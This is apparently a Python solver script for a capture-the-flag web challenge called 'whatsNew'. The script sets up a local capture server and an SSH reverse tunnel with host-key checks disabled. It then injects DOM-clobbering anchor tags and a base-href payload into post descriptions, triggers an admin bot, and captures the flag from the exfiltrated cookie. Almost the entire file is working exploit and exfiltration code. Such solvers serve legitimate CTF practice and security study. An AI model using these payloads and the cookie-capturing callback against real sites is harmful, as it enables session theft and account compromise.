#!/usr/bin/env python3
from __future__ import annotations

import json
import os
import queue
import re
import shutil
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path


ROOT = Path(__file__).resolve().parent
FLAG_RE = re.compile(r"K17\{[^}\r\n]+\}")


def load_endpoint(name: str) -> dict:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == name)
    for field in ("password_env", "token_env", "key_file_env"):
        if field in endpoint:
            endpoint[field.removesuffix("_env")] = os.environ[endpoint[field]]
    return endpoint


def post_form(base_url: str, path: str, fields: dict[str, str]) -> int:
    body = urllib.parse.urlencode(fields).encode("ascii")
    request = urllib.request.Request(
        urllib.parse.urljoin(base_url.rstrip("/") + "/", path.lstrip("/")),
        data=body,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "whatsNew-solver/1.0",
        },
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=15) as response:
        return response.status


def start_capture_server() -> tuple[ThreadingHTTPServer, threading.Event, list[str]]:
    captured: list[str] = []
    ready = threading.Event()

    class CaptureHandler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            query = urllib.parse.parse_qs(urllib.parse.urlsplit(self.path).query)
            for value in query.get("cookie", []):
                match = FLAG_RE.search(value)
                if match:
                    captured.append(match.group(0))
                    ready.set()
                    break
            self.send_response(204)
            self.end_headers()

        def log_message(self, _format: str, *args: object) -> None:
            return

    server = ThreadingHTTPServer(("127.0.0.1", 0), CaptureHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, ready, captured


def start_tunnel(endpoint: dict, local_port: int) -> tuple[subprocess.Popen[str], str]:
    ssh = shutil.which("ssh")
    if ssh is None:
        raise RuntimeError("ssh executable was not found")

    command = [
        ssh,
        "-T",
        "-p",
        str(endpoint["port"]),
        "-o",
        "ExitOnForwardFailure=yes",
        "-o",
        "ServerAliveInterval=30",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        f"UserKnownHostsFile={os.devnull}",
        "-R",
        f"80:127.0.0.1:{local_port}",
        f'{endpoint["username"]}@{endpoint["host"]}',
    ]
    process = subprocess.Popen(
        command,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        encoding="utf-8",
        errors="replace",
        bufsize=1,
    )
    assert process.stdout is not None

    lines: queue.Queue[str | None] = queue.Queue()

    def read_output() -> None:
        assert process.stdout is not None
        for line in process.stdout:
            lines.put(line)
        lines.put(None)

    threading.Thread(target=read_output, daemon=True).start()
    deadline = time.monotonic() + 20
    transcript = ""
    pattern = re.compile(
        r"tunneled with tls termination,\s*(https://[A-Za-z0-9.-]+)",
        re.IGNORECASE,
    )

    while time.monotonic() < deadline:
        try:
            line = lines.get(timeout=0.5)
        except queue.Empty:
            if process.poll() is not None:
                break
            continue
        if line is None:
            break
        transcript += line
        match = pattern.search(transcript)
        if match:
            return process, urllib.parse.urlsplit(match.group(1)).hostname or ""

    process.terminate()
    raise RuntimeError("reverse tunnel did not provide a public HTTPS hostname")


def exploit(base_url: str, callback_host: str) -> None:
    descriptions = {
        "tech": (
            "<a id=w&#104atsNew name=m&#111de href=x></a>"
            "<a id=w&#104atsNew name=c&#97tegory href=x></a>"
            "<a id=w&#104atsNew name=p&#97nel href=&#35latest-posts></a>"
        ),
        "travel": (
            "<a id=w&#104atsNew name=l&#97bel href=x></a>"
            "<a id=w&#104atsNew name=a&#117toReview href=1></a>"
            "<a id=w&#104atsNew name=n&#101xt href=/&#97dmin/x></a>"
        ),
        "food": f"<base href=&#47/{callback_host}/>",
    }

    for category, description in descriptions.items():
        post_form(
            base_url,
            f"/category/{category}/new",
            {
                "title": "proof",
                "author": "solver",
                "description": description,
                "reference": "proof",
            },
        )

    status = post_form(base_url, "/report", {})
    if status != 202:
        raise RuntimeError(f"report endpoint returned HTTP {status}")


def main() -> int:
    server: ThreadingHTTPServer | None = None
    tunnel: subprocess.Popen[str] | None = None
    try:
        main_endpoint = load_endpoint("main")
        tunnel_endpoint = load_endpoint("callback_tunnel")
        server, flag_ready, captured = start_capture_server()
        tunnel, callback_host = start_tunnel(
            tunnel_endpoint, server.server_address[1]
        )
        exploit(main_endpoint["url"], callback_host)
        if not flag_ready.wait(timeout=30):
            raise RuntimeError("admin bot callback timed out")
        flag = captured[0]
        sys.stdout.buffer.write(flag.encode("utf-8"))
        return 0
    except Exception as error:
        print(f"solve failed: {error}", file=sys.stderr)
        return 1
    finally:
        if server is not None:
            server.shutdown()
            server.server_close()
        if tunnel is not None and tunnel.poll() is None:
            tunnel.terminate()
            try:
                tunnel.wait(timeout=3)
            except subprocess.TimeoutExpired:
                tunnel.kill()
                tunnel.wait(timeout=3)


if __name__ == "__main__":
    raise SystemExit(main())
